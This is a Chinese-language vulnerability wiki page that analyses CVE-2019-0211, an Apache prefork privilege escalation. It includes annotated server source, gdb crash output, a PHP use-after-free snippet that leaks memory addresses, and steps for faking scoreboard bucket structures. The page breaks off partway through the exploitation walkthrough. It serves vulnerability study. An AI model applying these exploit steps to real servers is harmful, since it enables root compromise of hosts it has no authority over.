<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Apache/%EF%BC%88CVE-2019-0211%EF%BC%89Apache%20HTTP%20%E6%9C%8D%E5%8A%A1%E7%BB%84%E4%BB%B6%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>（CVE-2019-0211）Apache HTTP 服务组件提权漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "\uff08CVE-2019-0211\uff09Apache HTTP \u670d\u52a1\u7ec4\u4ef6\u63d0\u6743\u6f0f\u6d1e", url: "#_top", children: [
              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../ApachOFBiz/ApaceOFBizgetJSONuiLabelArray%E5%AD%98%E5%9C%A8%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0ssrf%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../ApachOFBiz/ApaceOFBizgetJSONuiLabelArray%E5%AD%98%E5%9C%A8%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0ssrf%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        Apace OFBiz getJSONuiLabelArray存在服务端请求伪造ssrf漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../%EF%BC%88CVE-2017-15715%EF%BC%89Apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../%EF%BC%88CVE-2017-15715%EF%BC%89Apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        （CVE-2017-15715）Apache解析漏洞
      </a>
    </div>
    
  </div>

    

    <h1 id="cve-2019-0211apache-http">（CVE-2019-0211）Apache HTTP 服务组件提权漏洞<a class="headerlink" href="#cve-2019-0211apache-http" title="Permanent link">&para;</a></h1>
<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<p>在Apache HTTP Server 2.4发行版2.4.17到2.4.38中，无论是使用Apache HTTP
Server 的MPM
event模式、还是worker或prefork模式，在低权限的子进程或线程中执行的代码(包括由进程内脚本解释器执行的脚本)可以通过操纵记分牌（scoreboard）来执行具有父进程(通常是Root进程)权限的任意代码。非unix系统则不受影响。</p>
<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<p>Apache HTTP Server 2.4.17-2.4.38</p>
<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<h3 id="_4">漏洞分析<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
<p>1.恶意用户首先修改bucket,并使其指向恶意构造的prefork_child_bucket结构（共享内存中）。</p>
<p>2.优雅重启</p>
<p>主服务进程会杀死以前所有的工作进程，然后调用prefork_run，fork出新的工作进程</p>
<div class="codehilite"><pre><span></span><code><span class="o">&lt;</span><span class="n">server</span><span class="o">/</span><span class="n">mpm</span><span class="o">/</span><span class="n">prefork</span><span class="o">/</span><span class="n">prefork</span><span class="p">.</span><span class="n">c</span><span class="o">&gt;</span>

<span class="o">//</span><span class="n">省略无关的部分</span>

<span class="k">static</span><span class="w"> </span><span class="nc">int</span><span class="w"> </span><span class="n">prefork_run</span><span class="p">(</span><span class="n">apr_pool_t</span><span class="w"> </span><span class="o">*</span><span class="n">_pconf</span><span class="p">,</span><span class="w"> </span><span class="n">apr_pool_t</span><span class="w"> </span><span class="o">*</span><span class="n">plog</span><span class="p">,</span><span class="w"> </span><span class="n">server_rec</span><span class="w"> </span><span class="o">*</span><span class="n">s</span><span class="p">)</span>
<span class="err">{</span>
<span class="w">    </span><span class="nc">int</span><span class="w"> </span><span class="k">index</span><span class="p">;</span>
<span class="w">    </span><span class="nc">int</span><span class="w"> </span><span class="n">remaining_children_to_start</span><span class="p">;</span>
<span class="w">    </span><span class="nc">int</span><span class="w"> </span><span class="n">i</span><span class="p">;</span>

<span class="w">    </span><span class="n">ap_log_pid</span><span class="p">(</span><span class="n">pconf</span><span class="p">,</span><span class="w"> </span><span class="n">ap_pid_fname</span><span class="p">);</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="err">!</span><span class="n">retained</span><span class="o">-&gt;</span><span class="n">mpm</span><span class="o">-&gt;</span><span class="n">was_graceful</span><span class="p">)</span><span class="w"> </span><span class="err">{</span><span class="o">//</span><span class="n">跳过</span><span class="err">，</span><span class="n">因为优雅启动时</span><span class="err">，</span><span class="n">was_graceful为true</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">ap_run_pre_mpm</span><span class="p">(</span><span class="n">s</span><span class="o">-&gt;</span><span class="n">process</span><span class="o">-&gt;</span><span class="n">pool</span><span class="p">,</span><span class="w"> </span><span class="n">SB_SHARED</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">OK</span><span class="p">)</span><span class="w"> </span><span class="err">{</span>
<span class="w">            </span><span class="n">retained</span><span class="o">-&gt;</span><span class="n">mpm</span><span class="o">-&gt;</span><span class="n">mpm_state</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">AP_MPMQ_STOPPING</span><span class="p">;</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="err">!</span><span class="n">OK</span><span class="p">;</span>
<span class="w">        </span><span class="err">}</span>
<span class="w">        </span><span class="cm">/* fix the generation number in the global score; we just got a new,</span>
<span class="cm">         * cleared scoreboard</span>
<span class="cm">         */</span>
<span class="w">        </span><span class="n">ap_scoreboard_image</span><span class="o">-&gt;</span><span class="k">global</span><span class="o">-&gt;</span><span class="n">running_generation</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">retained</span><span class="o">-&gt;</span><span class="n">mpm</span><span class="o">-&gt;</span><span class="n">my_generation</span><span class="p">;</span>
<span class="w">    </span><span class="err">}</span>
<span class="p">...</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="err">!</span><span class="n">retained</span><span class="o">-&gt;</span><span class="n">mpm</span><span class="o">-&gt;</span><span class="n">was_graceful</span><span class="p">)</span><span class="w"> </span><span class="err">{</span>
<span class="w">        </span><span class="n">startup_children</span><span class="p">(</span><span class="n">remaining_children_to_start</span><span class="p">);</span>
<span class="w">        </span><span class="n">remaining_children_to_start</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="w">    </span><span class="err">}</span>
<span class="p">...</span>
<span class="w">    </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="err">!</span><span class="n">retained</span><span class="o">-&gt;</span><span class="n">mpm</span><span class="o">-&gt;</span><span class="n">restart_pending</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="err">!</span><span class="n">retained</span><span class="o">-&gt;</span><span class="n">mpm</span><span class="o">-&gt;</span><span class="n">shutdown_pending</span><span class="p">)</span><span class="w"> </span><span class="err">{</span>
<span class="p">...</span>
<span class="w">        </span><span class="n">ap_wait_or_timeout</span><span class="p">(</span><span class="o">&amp;</span><span class="n">exitwhy</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">status</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">pid</span><span class="p">,</span><span class="w"> </span><span class="n">pconf</span><span class="p">,</span><span class="w"> </span><span class="n">ap_server_conf</span><span class="p">);</span><span class="o">//</span><span class="n">获取被杀死的工作进程的PID</span>
<span class="p">...</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">pid</span><span class="p">.</span><span class="n">pid</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="err">{</span>
<span class="w">            </span><span class="n">processed_status</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ap_process_child_status</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pid</span><span class="p">,</span><span class="w"> </span><span class="n">exitwhy</span><span class="p">,</span><span class="w"> </span><span class="n">status</span><span class="p">);</span>
<span class="w">            </span><span class="n">child_slot</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ap_find_child_by_pid</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pid</span><span class="p">);</span><span class="o">//</span><span class="n">获取PID对应于计分板中对应parent的下标</span>
<span class="p">...</span>
<span class="w">            </span><span class="cm">/* non-fatal death... note that it&#39;s gone in the scoreboard. */</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">child_slot</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="err">{</span>
<span class="w">                </span><span class="p">(</span><span class="n">void</span><span class="p">)</span><span class="w"> </span><span class="n">ap_update_child_status_from_indexes</span><span class="p">(</span><span class="n">child_slot</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">SERVER_DEAD</span><span class="p">,</span>
<span class="w">                                                           </span><span class="p">(</span><span class="n">request_rec</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="k">NULL</span><span class="p">);</span>
<span class="w">                </span><span class="n">prefork_note_child_killed</span><span class="p">(</span><span class="n">child_slot</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
<span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">processed_status</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">APEXIT_CHILDSICK</span><span class="p">)</span><span class="w"> </span><span class="err">{</span>
<span class="w">                    </span><span class="cm">/* child detected a resource shortage (E[NM]FILE, ENOBUFS, etc)</span>
<span class="cm">                     * cut the fork rate to the minimum</span>
<span class="cm">                     */</span>
<span class="w">                    </span><span class="n">retained</span><span class="o">-&gt;</span><span class="n">idle_spawn_rate</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
<span class="w">                </span><span class="err">}</span>
<span class="w">                </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">remaining_children_to_start</span>
<span class="w">                    </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">child_slot</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">ap_daemons_limit</span><span class="p">)</span><span class="w"> </span><span class="err">{</span><span class="o">//</span><span class="n">如果工作进程的死亡不是致命的</span>
<span class="w">                    </span><span class="cm">/* we&#39;re still doing a 1-for-1 replacement of dead</span>
<span class="cm">                     * children with new children</span>
<span class="cm">                     */</span>
<span class="w">                    </span><span class="n">make_child</span><span class="p">(</span><span class="n">ap_server_conf</span><span class="p">,</span><span class="w"> </span><span class="n">child_slot</span><span class="p">,</span>
<span class="w">                               </span><span class="n">ap_get_scoreboard_process</span><span class="p">(</span><span class="n">child_slot</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">bucket</span><span class="p">);</span><span class="o">//</span><span class="n">则将死亡的工作进程的bucket作为参数传递</span><span class="err">（</span><span class="n">注意</span><span class="err">：</span><span class="n">bucket我们可以用</span><span class="err">“</span><span class="n">非常规手段</span><span class="err">”</span><span class="n">进行修改</span><span class="err">，</span><span class="n">从而提权</span><span class="err">）</span>
<span class="w">                    </span><span class="c1">--remaining_children_to_start;</span>
<span class="w">                </span><span class="err">}</span>
<span class="w">            </span><span class="err">}</span>
<span class="w">    </span><span class="err">}</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">OK</span><span class="p">;</span>
<span class="err">}</span>
</code></pre></div>

<p>make_child：</p>
<div class="codehilite"><pre><span></span><code><span class="k">static</span><span class="w"> </span><span class="nc">int</span><span class="w"> </span><span class="n">make_child</span><span class="p">(</span><span class="n">server_rec</span><span class="w"> </span><span class="o">*</span><span class="n">s</span><span class="p">,</span><span class="w"> </span><span class="nc">int</span><span class="w"> </span><span class="n">slot</span><span class="p">,</span><span class="w"> </span><span class="nc">int</span><span class="w"> </span><span class="n">bucket</span><span class="p">)</span>
<span class="err">{</span>
<span class="p">...</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="err">!</span><span class="n">pid</span><span class="p">)</span><span class="w"> </span><span class="err">{</span>
<span class="w">        </span><span class="n">my_bucket</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">all_buckets</span><span class="o">[</span><span class="n">bucket</span><span class="o">]</span><span class="p">;</span><span class="o">//</span><span class="n">使my_bucket指向共享内存中的到恶意构造的prefork_child_bucket结构</span>
<span class="p">...</span>
<span class="w">        </span><span class="n">child_main</span><span class="p">(</span><span class="n">slot</span><span class="p">,</span><span class="w"> </span><span class="n">bucket</span><span class="p">);</span>
<span class="p">...</span><span class="w">    </span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="err">}</span>
<span class="k">static</span><span class="w"> </span><span class="n">void</span><span class="w"> </span><span class="n">child_main</span><span class="p">(</span><span class="nc">int</span><span class="w"> </span><span class="n">child_num_arg</span><span class="p">,</span><span class="w"> </span><span class="nc">int</span><span class="w"> </span><span class="n">child_bucket</span><span class="p">)</span>
<span class="err">{</span>
<span class="p">...</span>
<span class="w">    </span><span class="n">status</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">SAFE_ACCEPT</span><span class="p">(</span><span class="n">apr_proc_mutex_child_init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">my_bucket</span><span class="o">-&gt;</span><span class="n">mutex</span><span class="p">,</span>
<span class="w">                                    </span><span class="n">apr_proc_mutex_lockfile</span><span class="p">(</span><span class="n">my_bucket</span><span class="o">-&gt;</span><span class="n">mutex</span><span class="p">),</span>
<span class="w">                                    </span><span class="n">pchild</span><span class="p">));</span><span class="o">//</span><span class="n">如果Apache侦听两个或更多端口</span><span class="err">，</span><span class="n">则SAFE_ACCEPT</span><span class="err">（</span><span class="o">&lt;</span><span class="n">code</span><span class="o">&gt;</span><span class="err">）</span><span class="n">将仅执行</span><span class="o">&lt;</span><span class="n">code</span><span class="o">&gt;</span><span class="p">(</span><span class="n">这通常是因为服务器侦听HTTP</span><span class="err">（</span><span class="mi">80</span><span class="err">）</span><span class="n">和HTTPS</span><span class="err">（</span><span class="mi">443</span><span class="err">）</span><span class="p">)</span>
<span class="p">...</span>
<span class="err">}</span>
<span class="n">APR_DECLARE</span><span class="p">(</span><span class="n">apr_status_t</span><span class="p">)</span><span class="w"> </span><span class="n">apr_proc_mutex_child_init</span><span class="p">(</span><span class="n">apr_proc_mutex_t</span><span class="w"> </span><span class="o">**</span><span class="n">mutex</span><span class="p">,</span>
<span class="w">                                                    </span><span class="n">const</span><span class="w"> </span><span class="nc">char</span><span class="w"> </span><span class="o">*</span><span class="n">fname</span><span class="p">,</span>
<span class="w">                                                    </span><span class="n">apr_pool_t</span><span class="w"> </span><span class="o">*</span><span class="n">pool</span><span class="p">)</span>
<span class="err">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="n">mutex</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">meth</span><span class="o">-&gt;</span><span class="n">child_init</span><span class="p">(</span><span class="n">mutex</span><span class="p">,</span><span class="w"> </span><span class="n">pool</span><span class="p">,</span><span class="w"> </span><span class="n">fname</span><span class="p">);</span>
<span class="err">}</span>
</code></pre></div>

<p>如果apr_proc_mutex_child_init执行，这导致（* mutex） - &gt; meth-&gt;
child_init（mutex，pool，fname）被调用，从而执行恶意代码（注意，执行恶意代码的时候，进程仍然处于root权限，后面才降低自身的权限）。</p>
<h4 id="gdbbucket">通过gdb恶意修改bucket值造成的崩溃<a class="headerlink" href="#gdbbucket" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code><span class="p">(</span><span class="n">gdb</span><span class="p">)</span><span class="w"> </span>
<span class="mi">716</span><span class="w">            </span><span class="n">child_main</span><span class="p">(</span><span class="n">slot</span><span class="p">,</span><span class="w"> </span><span class="n">bucket</span><span class="p">);</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span><span class="w"> </span><span class="n">s</span>
<span class="n">child_main</span><span class="w"> </span><span class="p">(</span><span class="n">child_num_arg</span><span class="o">=</span><span class="n">child_num_arg</span><span class="err">@</span><span class="n">entry</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">child_bucket</span><span class="o">=</span><span class="n">child_bucket</span><span class="err">@</span><span class="n">entry</span><span class="o">=</span><span class="mi">80808080</span><span class="p">)</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="n">prefork</span><span class="o">.</span><span class="n">c</span><span class="p">:</span><span class="mi">380</span>
<span class="mi">380</span><span class="w">    </span><span class="p">{</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span><span class="w"> </span><span class="n">n</span>
<span class="o">..........</span>
<span class="mi">432</span><span class="w">        </span><span class="n">status</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">SAFE_ACCEPT</span><span class="p">(</span><span class="n">apr_proc_mutex_child_init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">my_bucket</span><span class="o">-&gt;</span><span class="n">mutex</span><span class="p">,</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span><span class="w"> </span><span class="n">s</span>

<span class="n">Program</span><span class="w"> </span><span class="n">received</span><span class="w"> </span><span class="k">signal</span><span class="w"> </span><span class="n">SIGSEGV</span><span class="p">,</span><span class="w"> </span><span class="n">Segmentation</span><span class="w"> </span><span class="n">fault</span><span class="o">.</span>
<span class="mh">0x000000000046c16b</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">child_main</span><span class="w"> </span><span class="p">(</span><span class="n">child_num_arg</span><span class="o">=</span><span class="n">child_num_arg</span><span class="err">@</span><span class="n">entry</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span>
<span class="w">    </span><span class="n">child_bucket</span><span class="o">=</span><span class="n">child_bucket</span><span class="err">@</span><span class="n">entry</span><span class="o">=</span><span class="mi">80808080</span><span class="p">)</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="n">prefork</span><span class="o">.</span><span class="n">c</span><span class="p">:</span><span class="mi">432</span>
<span class="mi">432</span><span class="w">        </span><span class="n">status</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">SAFE_ACCEPT</span><span class="p">(</span><span class="n">apr_proc_mutex_child_init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">my_bucket</span><span class="o">-&gt;</span><span class="n">mutex</span><span class="p">,</span>
</code></pre></div>

<h4 id="_5">利用<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h4>
<p>利用分4个步骤</p>
<ul>
<li>
<p>获得工作进程的R/W访问权限</p>
</li>
<li>
<p>在共享内存中写一个假的prefork_child_bucket结构</p>
</li>
<li>
<p>使all_buckets [bucket]指向该结构</p>
</li>
<li>
<p>等待早上6:25获得任意函数调用</p>
</li>
</ul>
<p>问题：PHP不允许读写/proc/self/mem， 这会阻止我们利用简单方法编辑共享内存</p>
<h4 id="rw">获取工作进程内存的R/W访问权限<a class="headerlink" href="#rw" title="Permanent link">&para;</a></h4>
<h5 id="php-uaf-0-day">PHP UAF 0-day<a class="headerlink" href="#php-uaf-0-day" title="Permanent link">&para;</a></h5>
<p>由于mod_prefork经常与mod_php结合使用，因此通过PHP利用漏洞似乎很自然。我们使用PHP
7.x中的0day
UAF（这似乎也适用于PHP5.x）来完成利用(也可以利用CVE-2019-6977)</p>
<div class="codehilite"><pre><span></span><code><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span>

<span class="k">class</span><span class="w"> </span><span class="n">X</span><span class="w"> </span><span class="k">extends</span><span class="w"> </span><span class="n">DateInterval</span><span class="w"> </span><span class="n">implements</span><span class="w"> </span><span class="n">JsonSerializable</span>
<span class="p">{</span>
<span class="w">  </span><span class="n">public</span><span class="w"> </span><span class="n">function</span><span class="w"> </span><span class="n">jsonSerialize</span><span class="p">()</span>
<span class="w">  </span><span class="p">{</span>
<span class="w">    </span><span class="n">global</span><span class="w"> </span><span class="o">$</span><span class="n">y</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">p</span><span class="p">;</span>
<span class="w">    </span><span class="n">unset</span><span class="p">(</span><span class="o">$</span><span class="n">y</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
<span class="w">    </span><span class="o">$</span><span class="n">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">y</span><span class="p">;</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="o">$</span><span class="n">this</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>

<span class="n">function</span><span class="w"> </span><span class="n">get_aslr</span><span class="p">()</span>
<span class="p">{</span>
<span class="w">  </span><span class="n">global</span><span class="w"> </span><span class="o">$</span><span class="n">p</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">y</span><span class="p">;</span>
<span class="w">  </span><span class="o">$</span><span class="n">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>

<span class="w">  </span><span class="o">$</span><span class="n">y</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">new</span><span class="w"> </span><span class="n">X</span><span class="p">(</span><span class="s1">&#39;PT1S&#39;</span><span class="p">)];</span>
<span class="w">  </span><span class="n">json_encode</span><span class="p">([</span><span class="mi">1234</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="o">&amp;$</span><span class="n">y</span><span class="p">]);</span>
<span class="w">  </span><span class="nb">print</span><span class="p">(</span><span class="s2">&quot;ADDRESS: 0x&quot;</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="n">dechex</span><span class="p">(</span><span class="o">$</span><span class="n">p</span><span class="p">)</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>

<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="o">$</span><span class="n">p</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">get_aslr</span><span class="p">();</span>
</code></pre></div>

<p>这是PHP对象上的UAF： 我们unset
$y[0]（X的一个实例），但它仍然可以通过$this使用。</p>
<h5 id="uaf">UAF导致读/写<a class="headerlink" href="#uaf" title="Permanent link">&para;</a></h5>
<p>我们希望实现两件事：</p>
<ul>
<li>
<p>读取内存以查找all_buckets的地址</p>
</li>
<li>
<p>编辑共享内存，修改bucket，添加我们自定义的恶意结构</p>
</li>
</ul>
<p>幸运的是，PHP的堆位于内存中的那两个之前。</p>
<p>PHP堆，ap_scoreboard_image，all_buckets的内存地址</p>
<div class="codehilite"><pre><span></span><code><span class="n">root</span><span class="nv">@apaubuntu</span><span class="err">:</span><span class="o">~</span><span class="err">#</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="k">proc</span><span class="o">/</span><span class="mi">6318</span><span class="o">/</span><span class="n">maps</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">grep</span><span class="w"> </span><span class="n">libphp</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">grep</span><span class="w"> </span><span class="n">rw</span><span class="o">-</span><span class="n">p</span>
<span class="mi">7</span><span class="n">f4a8f9f3000</span><span class="o">-</span><span class="mi">7</span><span class="n">f4a8fa0a000</span><span class="w"> </span><span class="n">rw</span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="mi">00471000</span><span class="w"> </span><span class="mi">08</span><span class="err">:</span><span class="mi">02</span><span class="w"> </span><span class="mi">542265</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">apache2</span><span class="o">/</span><span class="n">modules</span><span class="o">/</span><span class="n">libphp7</span><span class="mf">.2</span><span class="p">.</span><span class="n">so</span>

<span class="p">(</span><span class="n">gdb</span><span class="p">)</span><span class="w"> </span><span class="n">p</span><span class="w"> </span><span class="o">*</span><span class="n">ap_scoreboard_image</span><span class="w"> </span>
<span class="err">$</span><span class="mi">14</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">{</span>
<span class="w">  </span><span class="k">global</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x7f4a9323e008</span><span class="p">,</span><span class="w"> </span>
<span class="w">  </span><span class="n">parent</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x7f4a9323e020</span><span class="p">,</span><span class="w"> </span>
<span class="w">  </span><span class="n">servers</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x55835eddea78</span>
<span class="err">}</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span><span class="w"> </span><span class="n">p</span><span class="w"> </span><span class="n">all_buckets</span><span class="w"> </span>
<span class="err">$</span><span class="mi">15</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">prefork_child_bucket</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="mh">0x7f4a9336b3f0</span>
</code></pre></div>

<p>由于我们在PHP对象上触发UAF，因此该对象的任何属性也将是UAF;
我们可以将这个zend_object
UAF转换为zend_string。因为zend_string的结构非常有用：</p>
<div class="codehilite"><pre><span></span><code><span class="p">(</span><span class="nx">gdb</span><span class="p">)</span><span class="w"> </span><span class="nx">ptype</span><span class="w"> </span><span class="nx">zend_string</span>
<span class="k">type</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">struct</span><span class="w"> </span><span class="nx">_zend_string</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">zend_refcounted_h</span><span class="w"> </span><span class="nx">gc</span><span class="p">;</span>
<span class="w">    </span><span class="nx">zend_ulong</span><span class="w"> </span><span class="nx">h</span><span class="p">;</span>
<span class="w">    </span><span class="nx">size_t</span><span class="w"> </span><span class="nx">len</span><span class="p">;</span>
<span class="w">    </span><span class="nx">char</span><span class="w"> </span><span class="nx">val</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
<span class="p">}</span>
</code></pre></div>

<p>len属性包含字符串的长度。
通过递增它，我们可以在内存中进一步读写，从而访问我们感兴趣的两个内存区域:共享内存和all_buckets。</p>
<h5 id="bucket-index-all_buckets">定位bucket index 和 all_buckets<a class="headerlink" href="#bucket-index-all_buckets" title="Permanent link">&para;</a></h5>
<p>我们需要修改ap_scoreboard_image-&gt;parent[worker_id]-&gt;bucket中的parent结构中的bucket。幸运的是，parent结构总是处于共享内存块的开始，因此很容易找到：</p>
<div class="codehilite"><pre><span></span><code>➜  /www curl 127.0.0.1
PID: 14380
7f8a19da9000-7f8a19dc1000 rw-s 00000000 00:04 61736                      /dev/zero (deleted)
➜  /www

(gdb) p &amp;ap_scoreboard_image-&gt;parent[0]
$1 = (process_score <span class="gs">*) 0x7f8a19da9040</span>
<span class="gs">(gdb) p &amp;ap_scoreboard_image-&gt;parent[1]</span>
<span class="gs">$2 = (process_score *</span>) 0x7f8a19da9064
(gdb)
</code></pre></div>

<p>为了定位到all_buckets,我们可以利用我们对prefork_child_bucket结构的了解:</p>
